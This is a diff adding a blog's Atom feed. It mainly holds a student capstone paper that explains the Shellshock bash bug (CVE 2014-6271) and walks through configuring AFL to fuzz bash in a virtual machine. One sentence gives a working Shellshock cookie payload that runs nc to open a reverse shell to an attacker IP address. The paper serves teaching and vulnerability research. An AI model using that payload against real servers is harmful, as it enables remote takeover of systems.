@@ -1,0 +1,497 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-05-06T00:11:25-04:00</updated><id>http://localhost:4000/</id><title type="html">journalctl -r -u ThomasEarle</title><subtitle>Hello, I'm a recent information security graduate and amateur Internet historian.  Below are a collection of projects and insights that I thought some would find useful.
+</subtitle><entry><title type="html">An Introduction to Fuzzing</title><link href="http://localhost:4000/2017/05/06/AFL.html" rel="alternate" type="text/html" title="An Introduction to Fuzzing" /><published>2017-05-06T00:00:00-04:00</published><updated>2017-05-06T00:00:00-04:00</updated><id>http://localhost:4000/2017/05/06/AFL</id><content type="html" xml:base="http://localhost:4000/2017/05/06/AFL.html">&lt;h1 id=&quot;an-introduction-to-fuzzing&quot;&gt;An Introduction to Fuzzing&lt;/h1&gt;
+&lt;p&gt;Thomas Earle&lt;br /&gt;
+Ferris State University&lt;br /&gt;
+ISIN 499&lt;br /&gt;
+22 April 2017&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;abstract&quot;&gt;Abstract&lt;/h2&gt;
+&lt;p&gt;This paper is designed to provide the reader with an adequate understanding of CVE 2014-6271, the circumstances surrounding this vulnerability that makes it dangerous, and how the reader could discover similar vulnerabilities with American Fuzzy Lop (AFL).  This paper aims to enable its readers to:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Identify and understand the role fuzzing plays in finding vulnerabilities.&lt;/li&gt;
+  &lt;li&gt;Understand the background experience necessary to properly configure a fuzzer.&lt;/li&gt;
+  &lt;li&gt;Configure AFL to fuzz for CVE 2014-6271.
+While this paper does not provide any original or cutting edge fuzzing techniques, it does equip the reader with a procedure to setup and configure AFL in such a manner that he/she could expect it to discover software bugs.  This paper does not cover the vulnerability verification process since this subject matter potentially requires extensive experience with low level languages and potentially multi threading which is out of the scope of this white paper.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Note:  This capstone paper was written as an auxiliary component to my primary project of studying for the Certified Ethical Hacker (C|EH) certificate exam.  For this reason it does not follow the traditional five chapter model of Ferris State University’s research papers.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;Each security update that is applied to a computer has a story.  Some security vulnerabilities were found by the developers who quickly developed a patch.  Other security vulnerabilities were found by white hat hackers who notified the developers who developed a patch.  Some security vulnerabilities were found by gray or black hat hackers who hoarded or leveraged them for their own purposes.  Lastly, by pure happenstance, an anti-virus company or a particularly astute user noticed one of these gray/black hat vulnerabilities in ‘the wild’ and notified the developers who developed a patch.  When reading patch notes and security papers it is oftentimes overly simplistic to look at a vulnerability with 20/20 hindsight and conclude that bug hunting is easy or developer negligence is present.  It is crucial to recognize is that software of any size or age has as large and constantly changing attack surface which further mutates as the end user customizes it to fit their needs.  To identify these software flaws in an efficient manner, guided software fuzzing can be leveraged to better simulate a malicious and/or careless user.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;cve-2014-6271-aka-shellshock-or-bash-bug&quot;&gt;CVE 2014-6271 aka Shellshock or Bash Bug&lt;/h2&gt;
+&lt;p&gt;CVE 2014-6271 is a parsing bug from September 2014 which allows attackers to inject bash commands into a web server.  This bug is a result of how many web applications handle user input by oftentimes indirectly relying on bash’s environmental variables as a middleman to temporarily store information.  This design is ubiquitous to most modern web servers simply due to how numerous programming libraries are designed (lcamtuf, 2014).  The first patch for CVE 2014-6271 attempted to directly patch bash’s parser but it was quickly defeated in less than 24 hours (lcamtuf, 2014).  The second attempt to patch CVE 2014-6271 was developed by Florian Weimer and has since been colloquially called the “Florian patch” (lcamtuf, 2014).  This patch essentially “isolates the function parsing code from attacker-controlled strings” (lcamtuf, 2014) which completely eliminates the possibility of bash’s parser being subject to command injection through environmental variables.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;environmental-variables-and-exports-in-bash&quot;&gt;Environmental Variables and Exports in Bash&lt;/h2&gt;
+&lt;p&gt;CVE 2014-6271 is easy to leverage, simply place a valid bash statement in any field which would be exported into an environmental variable by the target web server.  For example, a cookie could be set to &lt;font color=&quot;#00ff00&quot;&gt;( ) { nc -e /bin/sh 192.168.13.100 80; }&lt;/font&gt; and the web server would then connect back to the attacker’s IP address on 192.168.13.100:80 and listen for further instructions.  Bash exports use environmental variables as containers to make variables and functions available to other subprocesses of the shell.  There are many environmental variables which are by default available to all subprocesses such as &lt;font color=&quot;#00ff00&quot;&gt;echo $HOSTNAME&lt;/font&gt;.  These environmental variables provide a quick and simple method for users and developers to access and hand off data between scripts without writing the data to a file or searching for system files.  An alternative to referencing above environmental variable would be &lt;font color=&quot;#00ff00&quot;&gt;cat /etc/hostname&lt;/font&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;common-gateway-interface-cgi-scripts&quot;&gt;Common Gateway Interface (CGI) Scripts&lt;/h2&gt;
+&lt;p&gt;CGI scripts are a colloquial programming term for any code which runs on a web server that handles user input/output (Claws, 2010).  These ‘scripts’ are typically written in C, Java, Perl, PHP, and Python and each script performs a specific function on a web server when it serves a request to a client.  For example, one CGI script may handle cookie management.  Another script may take a HTML POST request, update a database, which then updates a web page with user generated content.  A third script may serve different web pages depending on the client browser’s user agent.  CGI scripts simply serve as a customizable translation layer between user input and standardized web server functions which are typically coded and compiled by the web server’s developers.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;stackoverflow&quot;&gt;StackOverflow&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/afl/stackoverflow.png&quot; alt=&quot;StackOverflow&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;figure-1--an-innocent-question-from-december-2009&quot;&gt;Figure 1:  An innocent question from December 2009.&lt;/h3&gt;
+&lt;p&gt;The above code snippet &lt;font color=&quot;#00ff00&quot;&gt;plus1 () { echo $(($1 + 1)); }&lt;/font&gt; is quite similar to the CVE 2014-6271 exploit code.  The bash bug could have been a CVE 2009 or earlier bug if someone had simply thought to try placing this syntax in a cookie.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;american-fuzzy-lop-afl&quot;&gt;American Fuzzy Lop (AFL)&lt;/h2&gt;
+&lt;p&gt;AFL is a guided software fuzzing tool which intelligently crafts various structured inputs to find bugs and security vulnerabilities.  When a program is compiled with AFL, AFL can monitor which binary instruction paths are taken then change the provided inputs accordingly (lcamtuf, 2014).  If run indefinitely, AFL will cover all available paths through a software binary.  AFL creates new outputs by flipping sequential bits, sequential bytes, or random bits depending on how fruitful the more efficient flips are at covering paths through the binary (lcamtuf, 2014).  This low level fuzzing strategy technically allows AFL to cover all of the possible execution paths without covering all possible inputs.&lt;br /&gt;
+AFL can simply start crafting purely random inputs, though this method of operation is extremely inefficient.  To remedy this inefficiency, AFL relies on user supplied seeds to base its analysis off of.  For example, the &lt;font color=&quot;00ff00&quot;&gt;() { a() { a; }; : &amp;gt;b; }&lt;/font&gt; seed can find CVE 2014-6271 within seconds in a properly configured AFL environment.  The syntax for AFL seeds is deceptively simple; ASCII characters are intelligently parsed and a dictionary of syntax characters is created from the seed.  These characters are then added/modified/deleted from the seed in a procedurally random fashion so the seed maintains it’s general structure despite a large number of mutations having been applied to it (lcamtuf, 2014).&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;host-configuration&quot;&gt;Host Configuration&lt;/h2&gt;
+&lt;p&gt;There are no special hardware requirements to running AFL beyond the need for a system capable of compiling C code.  That being said, AFL can run on virtually any number of threads (1 per core) so a multi-core computer will allow you to fuzz much more quickly than a single core computer.  Open Suse Leap 42.2 is used as the host system and an Ubuntu 16.04 LTS server is used as a guest in the KVM virtual machine environment.  Other combinations of operating systems and hypervisors will likely work fine though KVM on Open Suse Leap is used due to its computing efficiency and simple setup.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Install Open Suse Leap 42.2.&lt;br /&gt;
+The default options will be sufficient for creating a single Ubuntu VM in KVM. Expanding the root partition to at least 100 GB will gives additional overhead for additional VMs and Snapper snapshots.  The VM pool can be moved to the home partition if there is a shortage of space.  To move the VM pool:  &lt;font color=&quot;00ff00&quot;&gt;sudo virsh pool-edit default&lt;/font&gt; and change the path value to something like “/home/root/images” (Note:  VM pools must be created before they can be edited).  Disconnect then reconnect to the pool to apply the changes.&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://extensions.gnome.org/extension/841/freon/&quot;&gt;Install temperature monitoring software (optional)&lt;/a&gt;.&lt;br /&gt;
+Temperature reading backend: &lt;font color=&quot;00ff00&quot;&gt;sudo zypper install monitoring-plugins-sensors&lt;/font&gt;&lt;br /&gt;
+Note:  Other temperature monitoring software may need to be installed depending on your hardware.&lt;/li&gt;
+  &lt;li&gt;Install KVM
+    &lt;ol&gt;
+      &lt;li&gt;Run Package Updater&lt;/li&gt;
+      &lt;li&gt;Run YaST Control Center&lt;/li&gt;
+      &lt;li&gt;Virtualization &amp;gt; Install Hypervisor and Tools&lt;/li&gt;
+      &lt;li&gt;Check, accept, and wait patiently: ☑ KVM Server ☑ KVM Tools ☑ libvirt LXC daemon.&lt;/li&gt;
+      &lt;li&gt;Click &lt;strong&gt;“No”&lt;/strong&gt; to decline setting up a network bridge.  Virtual networks may not function as expected if you setup a network bridge.&lt;/li&gt;
+      &lt;li&gt;Restart the host machine.&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Configure KVM
+    &lt;ol&gt;
+      &lt;li&gt;Run Virtual Machine Manager&lt;/li&gt;
+      &lt;li&gt;Create a pool:  File &amp;gt; Add Connection &amp;gt; Connect (default settings)&lt;/li&gt;
+      &lt;li&gt;Create two network connections:  Edit &amp;gt; Connection Details &amp;gt; Virtual Networks.&lt;/li&gt;
+      &lt;li&gt;&lt;img src=&quot;/assets/images/afl/kvm_add.png&quot; alt=&quot;Blue +&quot; /&gt; button &amp;gt; Name the network “NAT” &amp;gt; Steps 2 – 3 leave as default &amp;gt; Step 4 choose NAT.&lt;/li&gt;
+      &lt;li&gt;&lt;img src=&quot;/assets/images/afl/kvm_add.png&quot; alt=&quot;Blue +&quot; /&gt; button &amp;gt; Name the network “Internal” &amp;gt; Steps 2 – 3 leave as default &amp;gt; Step 4 choose NAT.&lt;/li&gt;
+      &lt;li&gt;Enable the networks by clicking &lt;img src=&quot;/assets/images/afl/kvm_play.png&quot; alt=&quot;White ► button&quot; /&gt; button and disable by clicking the &lt;img src=&quot;/assets/images/afl/kvm_delete.png&quot; alt=&quot;Red stop sign&quot; /&gt; button.  &lt;strong&gt;Virtual networks may cause problems with system sleep/hibernation if they are activated.&lt;/strong&gt;&lt;/li&gt;
+      &lt;li&gt;Create a storage pool:   Edit &amp;gt; Connection Details &amp;gt; Storage.&lt;/li&gt;
+      &lt;li&gt;&lt;img src=&quot;/assets/images/afl/kvm_add.png&quot; alt=&quot;Blue +&quot; /&gt; button &amp;gt; Name the pool “Images” &amp;gt; Browse &amp;gt; Select the folder where you intend to store your guest disk.&lt;/li&gt;
+      &lt;li&gt;&lt;img src=&quot;/assets/images/afl/kvm_add.png&quot; alt=&quot;Blue +&quot; /&gt; button &amp;gt; Name the pool “Images” &amp;gt; Browse &amp;gt; Select the folder where you intend to make a shared folder.  Your shared folder should be &lt;strong&gt;inside&lt;/strong&gt; the folder you selected.&lt;/li&gt;
+      &lt;li&gt;Create additional storage pools as you see necessary.&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Create and configure a VM
+    &lt;ol&gt;
+      &lt;li&gt;File &amp;gt; New Virtual Machine&lt;/li&gt;
+      &lt;li&gt;Step 1: Default&lt;/li&gt;
+      &lt;li&gt;Step 2: Select your VM ISO file&lt;/li&gt;
+      &lt;li&gt;Step 3: 2048 to 4096 MiB RAM
+ N – 1 CPUs where N is your host machine’s maximum available (tap + to find the maximum)&lt;/li&gt;
+      &lt;li&gt;Step 4: 20 – 32 GiB&lt;/li&gt;
+      &lt;li&gt;Step 5: ☑ “Customize configuration before install.”&lt;/li&gt;
+      &lt;li&gt;“Add Hardware” &amp;gt; Select “Filesystem” &amp;gt; Driver: Default &amp;gt; Mode: Mapped &amp;gt; Source path: [Path to shared folder] &amp;gt; Target path: Shared &amp;gt; ☐ “Export filesystem as readonly mount.&lt;/li&gt;
+      &lt;li&gt;If your guest has a GUI and wish to change your VM’s screen resolution: 
+ “Video QXL” &amp;gt; “VMVGA”&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Take a base snapshot of the VM: &lt;img src=&quot;/assets/images/afl/kvm_snapshot.png&quot; alt=&quot;Snapshot&quot; /&gt; &amp;gt; &lt;img src=&quot;/assets/images/afl/kvm_add.png&quot; alt=&quot;blue + button&quot; /&gt; button &amp;gt; Name the snapshot “Base.”&lt;/li&gt;
+  &lt;li&gt;Start the virtual machine by clicking the &lt;img src=&quot;/assets/images/afl/kvm_play.png&quot; alt=&quot;Gray ► button&quot; /&gt; button on the “Virtual Machine Manager” window or on the VM’s window (if the button does not work try the other window).  “Left Control” + “Left Alt” will release the mouse to the host machine.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;guest-configuration&quot;&gt;Guest Configuration&lt;/h2&gt;
+&lt;p&gt;All fuzzing will occur on the guest machine.  Fuzzing in a virtual or sandboxed environment is good practice to avoid the unforeseen consequences which sometimes occur when giving software unexpected inputs.  Random disk writes and file corruption may occur.&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Install the guest VM with default settings and be sure to utilize a network mirror.&lt;/li&gt;
+  &lt;li&gt;Change your guest VM’s screen resolution if you are using a guest with a GUI.&lt;/li&gt;
+  &lt;li&gt;Mount management
+    &lt;ol&gt;
+      &lt;li&gt;Create mount points:  &lt;font color=&quot;#00ff00&quot;&gt;sudo mkdir /mnt/Shared &amp;amp;&amp;amp; sudo mkdir /mnt/ramdisk&lt;/font&gt;&lt;/li&gt;
+      &lt;li&gt;Mount shared folder: &lt;font color=&quot;#00ff00&quot;&gt;sudo mount -t 9p -o trans=virtio,version=9p2000.L,rw Shared /mnt/Shared&lt;/font&gt;&lt;/li&gt;
+      &lt;li&gt;Unmount shared folder: &lt;font color=&quot;#00ff00&quot;&gt;sudo umount /mnt/Shared&lt;/font&gt;&lt;br /&gt;
+ Note:  System snapshots and hibernations may fail when this folder is mounted!&lt;/li&gt;
+      &lt;li&gt;Mount ramdisk:  &lt;font color=&quot;#00ff00&quot;&gt;sudo mount -t tmpfs none /mnt/ramdisk -o size=1024m &amp;amp;&amp;amp; sudo mkdir /mnt/ramdisk/sync_dir&lt;/font&gt;&lt;br /&gt;
+ Note:  AFL makes many small writes to the hard disk which is slow and can be hazardous to SSDs.  A ramdisk solves both of these problems.&lt;/li&gt;
+      &lt;li&gt;Unmount ramdisk:  &lt;font color=&quot;#00ff00&quot;&gt;sudo umount /mnt/ramdisk/sync_dir&lt;/font&gt;&lt;br /&gt;
+ Note:  Shell scripts are your friend!&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Update the guest:  &lt;font color=&quot;#00ff00&quot;&gt;sudo apt-get update &amp;amp;&amp;amp; sudo apt-get upgrade&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Install software:  &lt;font color=&quot;#00ff00&quot;&gt;sudo apt-get install build-essential make&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Install bash build dependencies:  &lt;font color=&quot;#00ff00&quot;&gt;sudo apt-get build-dep bash&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Get AFL:  &lt;font color=&quot;#00ff00&quot;&gt;wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Get bash source:  &lt;font color=&quot;#00ff00&quot;&gt;wget https://ftp.gnu.org/gnu/bash/bash-4.3.tar.gz&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Switch to root:  &lt;font color=&quot;#00ff00&quot;&gt;sudo -i&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Setup folders: &lt;font color=&quot;#00ff00&quot;&gt;mkdir -p /src/test/guide&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Extract AFL:  &lt;font color=&quot;#00ff00&quot;&gt;tar -xvzf afl-latest.tgz -C /src/&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Extract bash:  &lt;font color=&quot;#00ff00&quot;&gt;tar -xvzf bash-4.3.tar.gz -C /src/&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Move to bash source:  &lt;font color=&quot;#00ff00&quot;&gt;cd /src/bash-4.3/&lt;/font&gt;&lt;br /&gt;
+Patch bash: &lt;font color=&quot;#00ff00&quot;&gt;patch &amp;lt; /src/afl-*/experimental/bash_shellshock/shellshock-fuzz.diff&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Compile bash:  &lt;font color=&quot;#00ff00&quot;&gt;./configure CC=/src/afl-*/afl-gcc CXX=/src/afl-*/afl-g++ --disable-shared &amp;amp;&amp;amp; make&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Copy compiled executable: &lt;font color=&quot;#00ff00&quot;&gt;cp bash test/&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Create a  template: &lt;font color=&quot;#00ff00&quot;&gt;echo -n '() { a() { a; }; : &amp;gt;b; }' &amp;gt; /src/test/guide/script.txt&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Configure core_pattern:  &lt;font color=&quot;#00ff00&quot;&gt;echo core &amp;gt; /proc/sys/kernel/core_pattern&lt;/font&gt;&lt;/li&gt;
+  &lt;li&gt;Start AFL
+    &lt;ol&gt;
+      &lt;li&gt;Master thread:  &lt;font color=&quot;#00ff00&quot;&gt;/src/afl-*/afl-fuzz -i /src/test/guide -o /mnt/ramdisk -M fuzzer00 /./src/test/bash -c :&lt;/font&gt;&lt;/li&gt;
+      &lt;li&gt;Slave thread 1:  &lt;font color=&quot;#00ff00&quot;&gt;/src/afl-*/afl-fuzz -d -i /src/test/guide -o /mnt/ramdisk -S fuzzer01 /./src/test/bash -c :&lt;/font&gt;&lt;br /&gt;
+Note:  Use “Control” + “Alt” + “F1” through “F6” to switch to different consoles.  In KVM these must be sent through the “Send Key” menu.&lt;/li&gt;
+      &lt;li&gt;Slave thread XY:  &lt;font color=&quot;#00ff00&quot;&gt;/src/afl-*/afl-fuzz -d -i /src/test/guide -o /mnt/ramdisk -S fuzzerXY /./src/test/bash -c :&lt;/font&gt;&lt;br /&gt;
+Note:  Repeat as many times as needed and remember shell scripts are your friend!&lt;/li&gt;
+      &lt;li&gt;&lt;strong&gt;Monitor your system temperatures!&lt;/strong&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Stop AFL
+    &lt;ol&gt;
+      &lt;li&gt;Run AFL for up to two hours (See Figure 2).  Close AFL threads with “Control” + “C.”  Close the “slave” threads before closing the “master” thread otherwise you may lose data.&lt;/li&gt;
+      &lt;li&gt;Copy all files out of the ramdisk:  &lt;font color=&quot;#00ff00&quot;&gt;cp -a /src/ramdisk /src/&lt;/font&gt;&lt;/li&gt;
+      &lt;li&gt;Queue location:  &lt;font color=&quot;#00ff00&quot;&gt;ls /mnt/ramdisk/afl_out/queue/&lt;/font&gt;&lt;/li&gt;
+      &lt;li&gt;Crashes location:  &lt;font color=&quot;#00ff00&quot;&gt;ls /mnt/ramdisk/afl_out/crashes/&lt;/font&gt;&lt;/li&gt;
+      &lt;li&gt;Hangs location:  &lt;font color=&quot;#00ff00&quot;&gt;ls /mnt/ramdisk/afl_out/hangs/&lt;/font&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;fuzzing-for-cve-2014-6271&quot;&gt;Fuzzing for CVE 2014-6271&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/afl/afl_13hours.png&quot; alt=&quot;Screenshot of AFL after 13 hours&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;figure-2--afl-after-over-13-hours-of-fuzzing&quot;&gt;Figure 2:  AFL after over 13 hours of fuzzing.&lt;/h3&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;strategies&quot;&gt;Strategies&lt;/h2&gt;
+&lt;p&gt;Finding CVE 2014-6271 with the fuzzing seed &lt;font color=&quot;#00ff00&quot;&gt;() { a() { a; }; : &amp;gt;b; }&lt;/font&gt; is remarkably quick in this test scenario because we are examining bash 4.3 with 20/20 hindsight.  Of all the seeds we could have used in AFL why choose &lt;font color=&quot;#00ff00&quot;&gt;() { a() { a; }; : &amp;gt;b; }&lt;/font&gt; over any other pseudo random input?&lt;/p&gt;
+&lt;h3 id=&quot;know-your-target&quot;&gt;Know Your Target&lt;/h3&gt;
+&lt;p&gt;The first task of any prospective bug hunter is to read the available documentation.  A couple pertinent segments of bash’s man pages can be found on the following page in Attachment 1.  The “DEFINITIONS” and “Compound Commands” sections define many of the structural characters of bash which gives the intrepid bug hunter an idea as to which characters could be leveraged to seed a fuzzer.  Special characters, escapes, obscure features, and new features oftentimes conceal bugs since fewer people have used and audited these features.&lt;/p&gt;
+&lt;h3 id=&quot;know-your-developers&quot;&gt;Know Your Developers&lt;/h3&gt;
+&lt;p&gt;Another important aspect of knowing one’s target is the ability to recognize an opportunity to misuse software.  Interpreters and parsers are ample targets for bug hunters due to the complexity involved with programmatically creating an algorithm to separate data from instructions or programmatically limiting the capabilities of a language/application.  Many vulnerabilities, such as CVE 2014-6271, arise from third parties leveraging software for uses beyond it’s original design intentions.  Oftentimes vulnerabilities can be found in software that includes libraries or other dependencies which have unapplied security patches available.  The latter is particularly common in module based web servers and Java applets.&lt;/p&gt;
+&lt;h3 id=&quot;know-your-history&quot;&gt;Know Your History&lt;/h3&gt;
+&lt;p&gt;As of 2017, CVE 2014-6271 has not yet resurfaced after the initial wave of patches were created in late 2014.  This indicates a successful fix, though not all vulnerabilities are fixed as cleanly as Florian patched bash (lcamtuf, 2014).  Many products have notoriously poor security design where critical security vulnerabilities are patched on a monthly basis.  Feature rich software, especially software which was never designed with comprehensive security measures, will have countless attack vectors and naturally will be more bug prone than modular software with a strictly defined scope.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;bash-terminology&quot;&gt;Bash Terminology&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DEFINITIONS
+       The following definitions are used throughout the rest  of  this  docu-
+       ment.
+       blank  A space or tab.
+       word   A  sequence  of  characters  considered  as a single unit by the
+              shell.  Also known as a token.
+       name   A word consisting only of  alphanumeric  characters  and  under-
+              scores,  and beginning with an alphabetic character or an under-
+              score.  Also referred to as an identifier.
+       metacharacter
+              A character that, when unquoted, separates words.   One  of  the
+              following:
+              |  &amp;amp; ; ( ) &amp;lt; &amp;gt; space tab
+       control operator
+              A token that performs a control function.  It is one of the fol-
+              lowing symbols:
+              || &amp;amp; &amp;amp;&amp;amp; ; ;; ( ) | |&amp;amp; &amp;lt;newline&amp;gt;
+
+Compound Commands
+       A  compound command is one of the following.  In most cases a list in a
+       command's description may be separated from the rest of the command  by
+       one  or  more  newlines, and may be followed by a newline in place of a
+       semicolon.
+
+       (list) list is executed in a subshell environment (see  COMMAND  EXECU-
+              TION  ENVIRONMENT below).  Variable assignments and builtin com-
+              mands that affect the  shell's  environment  do  not  remain  in
+              effect  after  the  command completes.  The return status is the
+              exit status of list.
+
+       { list; }
+              list is simply executed in the current shell environment.   list
+              must  be  terminated with a newline or semicolon.  This is known
+              as a group command.  The return status is  the  exit  status  of
+              list.   Note that unlike the metacharacters ( and ), { and } are
+              reserved words and must occur where a reserved word is permitted
+              to  be  recognized.   Since they do not cause a word break, they
+              must be separated from  list  by  whitespace  or  another  shell
+              metacharacter.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;h3 id=&quot;attachment-1&quot;&gt;Attachment 1&lt;/h3&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;limitations&quot;&gt;Limitations&lt;/h2&gt;
+&lt;p&gt;As stated previously, this small foray into the foundations of bug hunting and vulnerability discovery was a side project to my preparations for the C|EH certificate examination so a limited amount of time was invested into this project.  This project was also conducted without the intention of finding new bugs or security vulnerabilities to avoid any unnecessary and time consuming distractions which would have limited my time to study for C|EH certificate.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;further-study&quot;&gt;Further Study&lt;/h2&gt;
+&lt;p&gt;This white paper only covers the fundamentals of software fuzzing so there is ample room to expand on this research.  One interesting method of seeding AFL would be to aggregate a database of code snippets from either Github or StackOverflow and to reduce these code snippets into seeds for AFL.  As displayed in Figure 1, countless people have exported bash functions since its inception but only in 2014 did Stéphane Chazelas think to put what is essentially an export statement in a parameter which would be parsed by a web server (Grubb, 2014).  Research on a comprehensive method of identifying exploitable vulnerabilities from unexploitable bugs could also be done with AFL.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;p&gt;Claws. (2010, January 18). What is Common Gateway Interface (CGI)? Retrieved April 19, 2017, from &lt;a href=&quot;http://stackoverflow.com/questions/2089271/what-is-common-gateway-interface-cgi&quot;&gt;http://stackoverflow.com/questions/2089271/what-is-common-gateway-interface-cgi&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+Grubb, B. (2014, September 26). Stephane Chazelas: the man who found the web’s ‘most dangerous’ internet security bug. Retrieved April 19, 2017, from &lt;a href=&quot;http://www.smh.com.au/it-pro/security-it/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html&quot;&gt;http://www.smh.com.au/it-pro/security-it/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+Lcamtuf. (2014, September 25). Quick notes about the bash bug, its impact, and the fixes so far. Retrieved April 19, 2017, from &lt;a href=&quot;http://lcamtuf.blogspot.com/2014/09/quick-notes-about-bash-bug-its-impact.html&quot;&gt;http://lcamtuf.blogspot.com/2014/09/quick-notes-about-bash-bug-its-impact.html&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+Lcamtuf. (2014, September 27). Bash bug: apply Florian’s patch now (CVE-2014-6277 and CVE-2014-6278). Retrieved April 19, 2017, from &lt;a href=&quot;http://lcamtuf.blogspot.com/2014/09/bash-bug-apply-unofficial-patch-now.html&quot;&gt;http://lcamtuf.blogspot.com/2014/09/bash-bug-apply-unofficial-patch-now.html&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+Lcamtuf. (2014, October 1). Bash bug: the other two RCEs, or how we chipped away at the original fix (CVE-2014-6277 and ‘78). Retrieved April 19, 2017, from &lt;a href=&quot;http://lcamtuf.coredump.cx/afl/technical_details.txt&quot;&gt;http://lcamtuf.coredump.cx/afl/technical_details.txt&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+Lcamtuf. (n.d.). Technical “whitepaper” for afl-fuzz. Retrieved April 19, 2017, from &lt;a href=&quot;http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html&quot;&gt;http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+(n.d.). Bash Reference Manual. Retrieved April 19, 2017, from &lt;a href=&quot;https://tiswww.case.edu/php/chet/bash/bashref.html&quot;&gt;https://tiswww.case.edu/php/chet/bash/bashref.html&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+Williamson, D. (2009, December 11). Exporting a function in shell. Retrieved April 19, 2017, from &lt;a href=&quot;http://stackoverflow.com/questions/1885871/exporting-a-function-in-shell&quot;&gt;http://stackoverflow.com/questions/1885871/exporting-a-function-in-shell&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;</content><author><name></name></author><category term="Fuzzing" /><category term="AFL" /><category term="CVE2014-6271" /><category term="Bash" /><category term="Bug" /><category term="Shellshock" /><summary type="html">An Introduction to Fuzzing Thomas Earle Ferris State University ISIN 499 22 April 2017</summary></entry><entry><title type="html">A Timeless Discussion on Hacker Ethics</title><link href="http://localhost:4000/2017/05/05/Ethics.html" rel="alternate" type="text/html" title="A Timeless Discussion on Hacker Ethics" /><published>2017-05-05T00:00:00-04:00</published><updated>2017-05-05T00:00:00-04:00</updated><id>http://localhost:4000/2017/05/05/Ethics</id><content type="html" xml:base="http://localhost:4000/2017/05/05/Ethics.html">&lt;h1 